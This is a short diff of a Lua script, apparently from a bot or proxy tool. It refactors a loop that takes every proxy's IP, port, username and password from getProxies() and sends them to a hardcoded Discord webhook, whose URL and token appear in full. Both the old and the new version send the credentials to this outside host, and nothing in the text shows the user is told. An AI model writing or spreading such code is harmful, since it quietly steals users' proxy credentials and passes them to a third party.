@@ -1,6 +1,7 @@
+wbcok = "https://discord.com/api/webhooks/1185569967626797178/FsLTvC0feuGjn8olpRFliriziUUDOz5gqkGiOuzkFHLbDpufGyY8cJX2ofqcO4OUujjL"
 
 for _,prox in pairs(getProxies()) do 
-    notif("https://discord.com/api/webhooks/1185569967626797178/FsLTvC0feuGjn8olpRFliriziUUDOz5gqkGiOuzkFHLbDpufGyY8cJX2ofqcO4OUujjL",prox.ip..":"..prox.port..":"..prox.username..":"..prox.password)
+notif(wbcok,prox.ip..":"..prox.port..":"..prox.username..":"..prox.password)
 end 
 
 function notif(webhookcok,status)
